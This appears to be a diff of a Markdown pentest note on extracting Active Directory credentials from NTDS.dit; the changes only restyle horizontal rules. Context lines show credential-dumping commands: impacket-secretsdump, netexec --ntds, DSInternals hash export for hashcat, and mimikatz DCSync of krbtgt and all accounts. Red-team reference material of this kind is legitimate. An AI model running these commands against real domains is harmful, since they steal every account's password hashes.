@@ -16,7 +16,7 @@ linked:
 ---
 # NTDS.dit Extraction - Tooling
 
-***
+---
 
 ## impacket-secretsdump
 
@@ -41,7 +41,7 @@ sudo apt install python3-impacket
 impacket-secretsdump corp.local/administrator:'P@ssw0rd'@dc01.corp.local -just-dc-ntlm
 ```
 
-___
+---
 
 ## nxc / netexec
 
@@ -63,7 +63,7 @@ nxc smb dc01.corp.local -u administrator -p 'P@ssw0rd' --ntds --enabled
 ls ~/.nxc/logs/ | grep ntds
 ```
 
-___
+---
 
 ## DSInternals (PowerShell)
 
@@ -87,7 +87,7 @@ Get-ADDBAccount -All -DatabasePath '.\ntds.dit' -BootKey $key |
   Out-File .\hashes_hashcat.txt
 ```
 
-___
+---
 
 ## Mimikatz lsadump (on DC)
 
@@ -107,7 +107,7 @@ mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
 mimikatz # lsadump::dcsync /domain:corp.local /all /csv
 ```
 
-___
+---
 
 ## Otras herramientas
 
@@ -120,7 +120,7 @@ ___
 | `Rubeus asktgt + dcsync` | Kerberos-based DCSync setup | Específico. |
 ^ntds-tool-other
 
-___
+---
 
 ## Recursos
 
@@ -135,4 +135,4 @@ ___
 | MITRE ATT&CK T1003.003 | `https://attack.mitre.org/techniques/T1003/003/` |
 ^ntds-tool-resources
 
-***
+---
